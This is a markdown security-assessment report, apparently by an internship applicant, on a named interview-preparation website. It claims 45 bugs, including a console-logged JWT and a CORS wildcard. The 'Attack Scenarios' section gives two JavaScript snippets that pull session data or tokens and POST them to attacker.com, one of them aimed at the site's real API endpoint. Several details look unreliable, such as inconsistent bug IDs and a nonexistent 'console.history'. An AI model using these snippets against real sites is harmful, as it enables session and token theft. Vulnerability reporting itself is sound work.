### Uptoskills-task1

# InterviewGod.ai - Penetration Testing & QA Report  
**Professional Security Assessment + 45 Bugs Found (7 Critical)**  
`GitHub Repository Structure & Full Markdown Report`  
Prepared by: **Komal Ratnaparkhe** | komalrratnaparkhe@gmail.com  
Date: **November 09, 2025** | Testing Duration: **6 hours**  
Target: https://www.interviewgod.ai  

> **CONFIDENTIAL** – This repository contains sensitive findings including JWT tokens, internal Google debug endpoints, and account takeover vectors. Do **not** make public without explicit permission.

```
InterviewGod-PenTest-Report/
├── README.md                  ← This file (full executive report)
├── REPORT.md                  ← Complete 30-page detailed report (Markdown)
├── screenshots/               ← All 40+ bug screenshots
│   ├── bug_003_token_exposed.png
│   ├── bug_006_cors_wildcard.png
│   ├── bug_007_caido_google_leak_full.png
│   ├── bug_043_google_ddljson_debug.png
│   └── ...
├── evidence/
│   ├── caido-session.har      ← Full proxy traffic (Google leaks + CORS PoC)
│   ├── network-logs.json
│   └── console-logs.txt
├── BUGS.md                    ← Table of all 45 bugs with CVSS & PoC
├── RECOMMENDATIONS.md         ← Prioritized remediation roadmap
├── CVE-MAPPING.md             ← OWASP Top 10 + CVE analogies
└── .gitignore
```

---

# README.md (Copy-Paste This as Your Main GitHub Repo File)

```markdown
# InterviewGod.ai - Security & QA Penetration Test Report
**45 Bugs | 7 Critical | Full Account Takeover Risk | Google Internal Endpoint Leak**

![InterviewGod.ai Logo]

**Researcher:** Komal Ratnaparkhe  
**Role:** Cybersecurity / QA Intern Applicant  
**Date:** November 09, 2025  
**Testing Time:** 6 hours  
**Tools:** Chrome DevTools 130 · Caido Proxy v1.0.13 · Lighthouse  
**Target:** https://www.interviewgod.ai (Desktop + Mobile)

---

## Executive Summary

> **TL;DR:** The platform has **game-changing AI potential** but ships with **critical security flaws that allow full account takeover, session hijacking, and silent tracking via undocumented Google infrastructure**.

### Key Stats
| Severity  | Count | Example |
|---------|-------|--------|
| Critical   | 7     | JWT token in console · CORS `*` with credentials |
| High       | 18    | WebSocket 1006 drops · Google debug endpoint leak |
| Medium     | 14    | Verbose logging · Undefined API bodies |
| Low        | 6     | AI assistance console spam |

**Total: 45 bugs** · Estimated fix time: **200–270 hours (5–7 weeks)**

### Top 3 Kill-Shots (Fix in <24h)
1. **BUG-003** – Full JWT leaked in console → Instant account takeover  
2. **BUG-006** – `Access-Control-Allow-Origin: *` + credentials → Any site steals sessions  
3. **BUG-007** – Hardcoded calls to `google.com/async/ddljson` (internal debug endpoint)

---

## Hall of Fame Findings (Never Seen in Competitors)

| Finding | Why It Matters |
|-------|--------------|
| Silent fallback to **Google internal async endpoints** when proxying | Reveals app is a thin wrapper over Google Closure Library → supply-chain DoS risk |
| `ddljson` debug endpoint returning `{"ddljson": {}}` with `filename="f.txt"` | Google Web Server (gws) fingerprint + unnecessary cookies |
| **CORS wildcard** on authenticated AWS API Gateway | Malicious site PoC steals workspace data in 1 line |
| Client-side Google Analytics with **provisional headers** | GDPR violation + fingerprinting even with uBlock |

> Competitors (Hirize, Metaview, BrightHire) use **server-side GTM** or **Plausible** → zero CORB, zero Google debug leaks.

---

## Vulnerability Summary Table

| ID | Title | Severity | CVSS | OWASP | Status |
|----|------|----------|------|-------|--------|
| IG-001 | Sensitive JWT Token Logged to Console | Critical | 9.1 | A05:2021 | Open |
| IG-002 | CORS Misconfiguration (`Access-Control-Allow-Origin: *`) | Critical | 9.8 | A05:2021 | Open |
| IG-003 | Google Internal Debug Endpoint Leak (`ddljson`) | High | 8.2 | A06:2021 | Open |
| IG-004 | WebSocket Unclean Closure (1006) | High | 7.5 | A03:2021 | Open |
| IG-005 | OTP Verification API 400 Errors (Proxy-Related) | High | 7.5 | A04:2021 | Needs Verification |
| ... | 40 more in `BUGS.md` | | | | |

---

## Attack Scenarios (PoC Ready)

### 1. Full Session Hijack via CORS (30 seconds)
```js
fetch('https://pp0jjs0uq1.execute-api.ap-south-1.amazonaws.com/workspace/detail', {
  credentials: 'include'
}).then(r => r.json()).then(data => fetch('https://attacker.com/steal', {
  method: 'POST', body: JSON.stringify(data)
}));
```

### 2. Steal JWT via Malicious Extension
```js
setInterval(() => {
  const token = localStorage.getItem('token') || [...console.history].find(h => h.includes('9b8403f9eafda'));
  if (token) fetch('https://attacker.com/log', {method:'POST', body:token});
}, 1000);
```

---

## Recommended Fix Priority

mermaid
gantt
    title Remediation Roadmap
    dateFormat  YYYY-MM-DD
    section Week 1 (Immediate)
    Fix 7 Critical Bugs           :crit, 2025-11-10, 7d
    Strip All console.log         :2025-11-10, 3d
    section Weeks 2-4
    High Severity + Session Mgmt  :2025-11-17, 14d
    Accessibility + Mobile Fix    :2025-11-20, 10d
    section Months 2-3
    Automated Testing Suite       :2025-12-01, 30d
    Security Headers + WAF        :2025-12-15, 14d


---

## Next Steps for InterviewGod Team

1. **Clone this repo privately**
2. Run: `git pull && open REPORT.md`
3. Assign bugs in Jira/GitHub Issues using `IG-XXX` labels
4. Schedule remediation sync (I’m available for follow-up testing)
5. Consider bug bounty credits 😉

---

**This platform can dominate the AI interview space — just needs security hardening.**

Ready to re-test after fixes? → komalrratnaparkhe@gmail.com

**Confidentiality Notice:** Do not fork/publicize. Delete after 90 days.
```

(Expand to all 45 — use the numbering from my final version)

### 3. `RECOMMENDATIONS.md`

```markdown
## Immediate (Week 1)
- [ ] Remove all `console.log` in production build
- [ ] Set `Access-Control-Allow-Origin: https://www.interviewgod.ai`
- [ ] Move JWT to httpOnly cookies
- [ ] Strip Google Closure Library debug code
```

### 4. `.gitignore`

```
# Sensitive
evidence/*.har
*.log
.DS_Store
node_modules/
```

### 5. Report pdf
Create `[Report & screenshots/](https://docs.google.com/document/d/13fnUHI9smwQtUbXxXOZKn6QYxZkdNB_Mkzhp7wujNfs/edit?usp=drive_link).

---

```
